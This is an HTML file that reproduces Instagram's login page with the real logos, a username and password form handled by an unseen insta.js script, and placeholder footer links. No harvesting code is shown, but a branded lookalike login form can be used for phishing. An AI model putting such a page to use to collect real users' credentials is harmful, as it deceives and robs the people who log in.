<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="./insta.css">
</head>

<body>
    <main>
        <div class="wrapper">
            <div class="content">
                <img class="imaging"
                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                    alt="Instagram">
                <form action="" id="loginform">
                    <input type="email" placeholder="Phone number,username,or email" id="username" required>
                    <input type="password" placeholder="password" id="password">

                    <input type="button" value="Login" class="btn-login" onclick="login()">
                    <div class="divine">
                        <div class="small"></div>
                        <div>OR</div>
                        <div class="small1"></div>
                    </div>
                    <div class="btn-group">
                        <div class="btn-fb">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fb/Facebook_icon_2013.svg/300px-Facebook_icon_2013.svg.png" alt="" style="width:4%;height:4%">
                            <a href="#"class="log">Log in with Facebook</a>
                        </div>
                    </div>
                    <a href="#" class="forgot-pw">Forgot password?</a>

                </form>
            </div>
            <div class="sign">
                <p>
                    Don't have an account?
                    <a href="#" style="color:hsl(210, 87%, 59%) ;">Sign up</a>
                </p>
            </div>
            <div class="app">
                <p>Get the app.</p>
                <div class="store-link">
                    <a href="#">
                        <img alt="Get it on Google Play" class="aa"
                            src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png">
                    </a>
                    <a href="#">
                        <img alt="Get it from Microsoft" class="aa"
                            src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png">
                    </a>
                </div>
            </div>
        </div>
    </main>
    <footer>
        <div class="footer">
            <div> <a href="">Meta</a></div>
            <div><a href="">About</a></div>
            <div><a href=""> Blog</a></div>
            <div><a href=""> Jobs </a></div>
            <div> <a href=""> Help</a></div>
            <div><a href=""> API</a></div>
            <div><a href="">Privacy</a></div>
            <div><a href=""> Terms</a></div>
            <div><a href="">Locations</a></div>
            <div> <a href="">Threads</a></div>
            <div><a href="">MetaVerified</a></div>
            <div><a href="">InstagramLite</a></div>
        </div>
        <div class="english">
            <select  class="language">
                <option value="af">English</option>
                <option value="ar">Telugu</option>
                <option value="cs">Hidhi</option>
                <option value="da">french</option>
                <option value="de">Deutsch</option>
                <option value="el">marati</option>
                <option value="en">English</option>
                <option value="en-gb">English (UK)</option>
                <option value="es">kanada</option>
                <option value="es-la">tamil</option>
            </select>
            <div><a href=""> Â© 2024 Instagram from Meta</a></div>
        </div>

    </footer>

</body>
<script src="./insta.js"></script>

</html>
